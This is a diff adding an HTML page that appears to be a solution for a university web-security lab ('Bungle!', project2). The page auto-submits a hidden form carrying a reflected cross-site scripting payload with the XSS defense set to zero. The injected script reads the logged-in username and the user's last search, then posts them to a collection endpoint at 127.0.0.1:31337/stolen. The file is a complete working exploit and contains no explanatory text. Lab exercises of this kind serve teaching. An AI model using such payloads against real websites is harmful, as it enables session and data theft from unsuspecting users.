@@ -1,0 +1,18 @@
+<html>
+    <head>
+        <title>Bungle!</title>
+        <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    </head>
+    <body>
+        <form name="redirect" method="get" action="http://ecen5032.org/project2/search">
+            <input name="xssdefense" value="0" type="hidden">
+            <input name="q" value="<script>setTimeout(function(){username = document.getElementById('logged-in-user').textContent;lastSearch = document.getElementsByClassName('list-group-item')[1].textContent;urlstr = '127.0.0.1:31337/stolen?user='+username+'&last_search='+escape(lastSearch);$.post(urlstr, function(){});}, 300);</script>" type="hidden">
+        </form>
+        <iframe width="750" height="400" border="0" name="dummyframe" id="dummyframe">
+        </iframe>
+        <div id="anchor">HELLO!</div>
+        <script>
+            document.redirect.submit();
+        </script>
+    </body>
+</html>
